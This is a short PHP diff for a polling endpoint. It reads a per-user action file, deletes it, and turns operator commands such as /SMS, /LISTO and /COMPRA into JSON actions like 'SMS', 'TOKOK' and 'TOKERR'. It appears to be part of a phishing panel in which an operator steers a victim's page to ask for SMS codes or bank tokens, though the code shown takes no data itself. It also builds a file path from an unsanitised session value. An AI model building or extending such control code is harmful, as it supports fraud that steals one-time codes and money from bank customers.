@@ -2,17 +2,19 @@
 session_start();
 header('Content-Type: application/json');
 
-if (empty($_SESSION['usuario'])) {
-    echo '{"action":"wait"}'; exit;
-}
+$usuario = $_SESSION['usuario'] ?? null;
+if (!$usuario) { echo '{"action":"wait"}'; exit; }
 
-$u    = $_SESSION['usuario'];
-$tipo = $_GET['tipo'] ?? 'login';
+$archivo = "acciones/$usuario.txt";
+if (!file_exists($archivo)) { echo '{"action":"wait"}'; exit; }
 
-$file = "data/" . md5($u) . "_{$tipo}.json";
+$accion = trim(file_get_contents($archivo));
+@unlink($archivo);
 
-if (!file_exists($file)) { echo '{"action":"wait"}'; exit; }
-
-$data = json_decode(file_get_contents($file), true);
-@unlink($file);
-echo json_encode($data ?: ['action' => 'wait']);
+$map = [
+    '/ERROR'  => 'ERROR',
+    '/SMS'    => 'SMS',
+    '/LISTO'  => 'TOKOK',
+    '/COMPRA' => 'TOKERR',
+];
+echo json_encode(['action' => $map[$accion] ?? 'wait']);
